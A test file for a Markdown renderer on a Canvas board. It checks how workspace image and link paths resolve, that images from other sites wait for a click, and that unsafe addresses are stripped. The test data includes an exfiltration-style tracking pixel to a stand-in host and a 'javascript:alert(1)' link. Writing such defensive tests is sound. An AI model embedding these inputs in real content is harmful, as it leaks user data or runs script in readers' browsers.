/**
 * Markdown on the Canvas board names workspace files by path, and holds
 * images from elsewhere as the chat does.
 */

import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';

import CanvasMarkdown from '../CanvasMarkdown';

describe('CanvasMarkdown', () => {
  it('loads an image an agent named by its workspace path', () => {
    render(
      <CanvasMarkdown workflowId="wf-1">
        {'## Exhibits\n\n![Exhibit 1 — India IT-5 net headcount change, FY23→FY26](charts/it_headcount.png)'}
      </CanvasMarkdown>,
    );

    const image = screen.getByRole('img', { name: 'Exhibit 1 — India IT-5 net headcount change, FY23→FY26' });
    expect(image).toHaveAttribute('src', '/api/workspace/wf-1/files/charts/it_headcount.png');
    expect(image).toHaveAttribute('referrerpolicy', 'no-referrer');
  });

  it('reads a relative path from the document’s own folder', () => {
    render(<CanvasMarkdown workflowId="wf-1" baseDir="reports">{'![Revenue](../charts/revenue.png)'}</CanvasMarkdown>);

    expect(screen.getByRole('img', { name: 'Revenue' })).toHaveAttribute('src', '/api/workspace/wf-1/files/charts/revenue.png');
  });

  it('holds an image from another site until the owner asks for it', async () => {
    const user = userEvent.setup();
    render(<CanvasMarkdown workflowId="wf-1">{'![pixel](https://tracker.example/p.png?d=secret)'}</CanvasMarkdown>);

    expect(screen.queryByRole('img')).toBeNull();
    await user.click(screen.getByRole('button', { name: 'Show image from tracker.example' }));
    expect(screen.getByRole('img', { name: 'pixel' })).toHaveAttribute('src', 'https://tracker.example/p.png?d=secret');
  });

  it('opens a link in a new tab, a workspace file from the workspace file route', () => {
    render(
      <CanvasMarkdown workflowId="wf-1">
        {'[the data](data/q2.csv) and [the source](https://example.com/report) and [totals](#totals)'}
      </CanvasMarkdown>,
    );

    const data = screen.getByRole('link', { name: 'the data' });
    expect(data).toHaveAttribute('href', '/api/workspace/wf-1/files/data/q2.csv');
    expect(data).toHaveAttribute('target', '_blank');
    expect(data).toHaveAttribute('rel', 'noopener noreferrer');
    expect(screen.getByRole('link', { name: 'the source' })).toHaveAttribute('href', 'https://example.com/report');
    // A fragment stays in the document.
    expect(screen.getByRole('link', { name: 'totals' })).not.toHaveAttribute('target');
  });

  it('still drops an unsafe address', () => {
    render(<CanvasMarkdown workflowId="wf-1">{'[run](javascript:alert(1))'}</CanvasMarkdown>);

    expect(screen.getByText('run').closest('a')?.getAttribute('href') ?? '').not.toMatch(/javascript/i);
  });
});
